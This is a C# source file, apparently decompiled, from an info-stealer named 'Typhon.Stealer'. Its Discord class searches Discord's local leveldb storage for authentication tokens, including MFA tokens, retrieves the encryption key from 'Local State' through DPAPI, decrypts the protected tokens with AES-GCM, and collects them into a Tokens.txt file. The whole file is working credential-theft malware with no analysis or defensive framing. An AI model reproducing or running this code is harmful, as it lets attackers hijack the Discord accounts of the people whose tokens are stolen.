using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Typhon.Stealer.Software.Messaging
{
	// Token: 0x02000015 RID: 21
	internal class Discord
	{
		// Token: 0x06000062 RID: 98 RVA: 0x00004A00 File Offset: 0x00002C00
		public static void GetTokens(string sSavePath)
		{
			if (!Directory.Exists(sSavePath))
			{
				Directory.CreateDirectory(sSavePath);
			}
			string text = "";
			Regex regex = new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", RegexOptions.Compiled);
			Regex regex2 = new Regex("mfa\\.[\\w-]{84}", RegexOptions.Compiled);
			Regex regex3 = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
			string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\", "*.ldb", SearchOption.AllDirectories);
			for (int i = 0; i < files.Length; i++)
			{
				string input = File.ReadAllText(new FileInfo(files[i]).FullName);
				Match match = regex.Match(input);
				if (match.Success)
				{
					text = text + match.Value + "\n";
				}
				Match match2 = regex2.Match(input);
				if (match2.Success)
				{
					text = text + match2.Value + "\n";
				}
				Match match3 = regex3.Match(input);
				if (match3.Success)
				{
					string str = Discord.DecryptToken(Convert.FromBase64String(match3.Value.Split(new string[]
					{
						"dQw4w9WgXcQ:"
					}, StringSplitOptions.None)[1]));
					text = text + str + "\n";
				}
			}
			File.WriteAllText(sSavePath + "\\Tokens.txt", text);
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00004B3C File Offset: 0x00002D3C
		private static byte[] DecryptKey(string path)
		{
			object arg = JsonConvert.DeserializeObject(File.ReadAllText(path));
			if (Discord.<>o__1.<>p__2 == null)
			{
				Discord.<>o__1.<>p__2 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Discord)));
			}
			Func<CallSite, object, string> target = Discord.<>o__1.<>p__2.Target;
			CallSite <>p__ = Discord.<>o__1.<>p__2;
			if (Discord.<>o__1.<>p__1 == null)
			{
				Discord.<>o__1.<>p__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "encrypted_key", typeof(Discord), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Func<CallSite, object, object> target2 = Discord.<>o__1.<>p__1.Target;
			CallSite <>p__2 = Discord.<>o__1.<>p__1;
			if (Discord.<>o__1.<>p__0 == null)
			{
				Discord.<>o__1.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "os_crypt", typeof(Discord), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			return ProtectedData.Unprotect(Convert.FromBase64String(target(<>p__, target2(<>p__2, Discord.<>o__1.<>p__0.Target(Discord.<>o__1.<>p__0, arg)))).Skip(5).ToArray<byte>(), null, DataProtectionScope.CurrentUser);
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00004C44 File Offset: 0x00002E44
		private static string DecryptToken(byte[] buffer)
		{
			byte[] array = buffer.Skip(15).ToArray<byte>();
			AeadParameters aeadParameters = new AeadParameters(new KeyParameter(Discord.DecryptKey(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local State")), 128, buffer.Skip(3).Take(12).ToArray<byte>(), null);
			GcmBlockCipher gcmBlockCipher = new GcmBlockCipher(new AesEngine());
			gcmBlockCipher.Init(false, aeadParameters);
			byte[] array2 = new byte[gcmBlockCipher.GetOutputSize(array.Length)];
			gcmBlockCipher.DoFinal(array2, gcmBlockCipher.ProcessBytes(array, 0, array.Length, array2, 0));
			return Encoding.UTF8.GetString(array2).TrimEnd("\r\n\0".ToCharArray());
		}
	}
}
